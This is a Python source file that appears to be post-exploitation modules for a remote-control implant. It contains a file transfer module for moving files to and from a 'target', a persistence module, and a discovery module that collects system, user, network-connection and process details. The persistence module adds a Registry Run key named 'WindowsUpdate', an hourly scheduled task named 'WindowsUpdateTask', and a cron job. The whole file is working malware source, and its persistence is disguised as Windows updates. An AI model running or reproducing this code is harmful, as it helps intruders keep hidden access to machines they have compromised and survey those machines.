#!/usr/bin/env python3
import os
import platform
import shutil
import subprocess
import sys
from base_module import BaseModule

class FileTransferModule(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "file_transfer"
        self.description = "Transfer files to/from target"
        self.options = {
            "action": {
                "description": "upload or download",
                "required": True,
                "value": ""
            },
            "local_file": {
                "description": "Local file path",
                "required": True,
                "value": ""
            },
            "remote_file": {
                "description": "Remote file path",
                "required": False,
                "value": ""
            }
        }
    
    def run(self, agent, arguments):
        action = arguments.get('action')
        local_file = arguments.get('local_file')
        remote_file = arguments.get('remote_file', os.path.basename(local_file))
        
        if action == 'upload':
            return agent.upload_file(local_file, remote_file)
        elif action == 'download':
            return agent.download_file(remote_file, local_file)
        else:
            return "Invalid action. Use 'upload' or 'download'"

class PersistenceModule(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "persistence"
        self.description = "Establish persistence on target"
        self.platforms = ["windows", "linux"]
        self.privileges = ["admin"]
        self.options = {
            "method": {
                "description": "Persistence method (registry, scheduled_task, service, cron)",
                "required": True,
                "value": ""
            },
            "payload_path": {
                "description": "Path to payload for persistence",
                "required": False,
                "value": ""
            }
        }
    
    def run(self, agent, arguments):
        method = arguments.get('method')
        system = platform.system().lower()
        
        if system == 'windows':
            return self.windows_persistence(method, agent, arguments)
        elif system == 'linux':
            return self.linux_persistence(method, agent, arguments)
        else:
            return f"Unsupported platform: {system}"
    
    def windows_persistence(self, method, agent, arguments):
        if method == 'registry':
            return self.registry_persistence(agent, arguments)
        elif method == 'scheduled_task':
            return self.scheduled_task_persistence(agent, arguments)
        elif method == 'service':
            return self.service_persistence(agent, arguments)
        else:
            return f"Unknown Windows persistence method: {method}"
    
    def registry_persistence(self, agent, arguments):
        """Windows Registry Run key persistence"""
        try:
            payload_path = arguments.get('payload_path', sys.argv[0])
            
            # Add to HKCU Run key (requires user login)
            import winreg
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, payload_path)
            
            return f"Registry persistence established: {payload_path}"
            
        except Exception as e:
            return f"Registry persistence failed: {str(e)}"
    
    def scheduled_task_persistence(self, agent, arguments):
        """Windows Scheduled Task persistence"""
        try:
            payload_path = arguments.get('payload_path', sys.argv[0])
            task_name = "WindowsUpdateTask"
            
            # Create scheduled task (run every hour)
            cmd = f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc hourly /mo 1 /f'
            subprocess.run(cmd, shell=True, capture_output=True)
            
            return f"Scheduled task created: {task_name}"
            
        except Exception as e:
            return f"Scheduled task creation failed: {str(e)}"
    
    def linux_persistence(self, method, agent, arguments):
        if method == 'cron':
            return self.cron_persistence(agent, arguments)
        elif method == 'service':
            return self.linux_service_persistence(agent, arguments)
        else:
            return f"Unknown Linux persistence method: {method}"
    
    def cron_persistence(self, agent, arguments):
        """Linux cron job persistence"""
        try:
            payload_path = arguments.get('payload_path', sys.argv[0])
            
            # Add to user's crontab (run every 10 minutes)
            cron_job = f"*/10 * * * * {payload_path}\n"
            
            # Method 1: Direct crontab editing
            subprocess.run(f'(crontab -l ; echo "{cron_job}") | crontab -', 
                         shell=True, capture_output=True)
            
            return "Cron persistence established"
            
        except Exception as e:
            return f"Cron persistence failed: {str(e)}"

class DiscoveryModule(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "discovery"
        self.description = "Discover system and network information"
        self.options = {
            "scope": {
                "description": "Discovery scope (system, network, processes, all)",
                "required": False,
                "value": "all"
            }
        }
    
    def run(self, agent, arguments):
        scope = arguments.get('scope', 'all')
        results = {}
        
        if scope in ['system', 'all']:
            results['system'] = self.get_system_info()
        
        if scope in ['network', 'all']:
            results['network'] = self.get_network_info()
        
        if scope in ['processes', 'all']:
            results['processes'] = self.get_process_info()
        
        return json.dumps(results, indent=2)
    
    def get_system_info(self):
        """Collect detailed system information"""
        import psutil
        
        info = {
            'hostname': platform.node(),
            'os': platform.platform(),
            'architecture': platform.architecture()[0],
            'processor': platform.processor(),
            'ram_total': psutil.virtual_memory().total,
            'ram_available': psutil.virtual_memory().available,
            'disk_usage': {},
            'users': []
        }
        
        # Disk information
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                info['disk_usage'][partition.mountpoint] = {
                    'total': usage.total,
                    'used': usage.used,
                    'free': usage.free
                }
            except:
                pass
        
        # User information
        for user in psutil.users():
            info['users'].append({
                'name': user.name,
                'terminal': user.terminal,
                'host': user.host,
                'started': user.started
            })
        
        return info
    
    def get_network_info(self):
        """Collect network information"""
        import psutil
        import socket
        
        network_info = {
            'interfaces': {},
            'connections': [],
            'dns_servers': []
        }
        
        # Network interfaces
        for interface, addrs in psutil.net_if_addrs().items():
            network_info['interfaces'][interface] = []
            for addr in addrs:
                network_info['interfaces'][interface].append({
                    'family': addr.family.name,
                    'address': addr.address,
                    'netmask': addr.netmask,
                    'broadcast': addr.broadcast
                })
        
        # Active connections
        for conn in psutil.net_connections():
            network_info['connections'].append({
                'family': conn.family.name,
                'type': conn.type.name,
                'local_addr': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                'remote_addr': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                'status': conn.status
            })
        
        return network_info
    
    def get_process_info(self):
        """Collect running process information"""
        import psutil
        
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
            try:
                processes.append(proc.info)
            except psutil.NoSuchProcess:
                pass
        
        return processes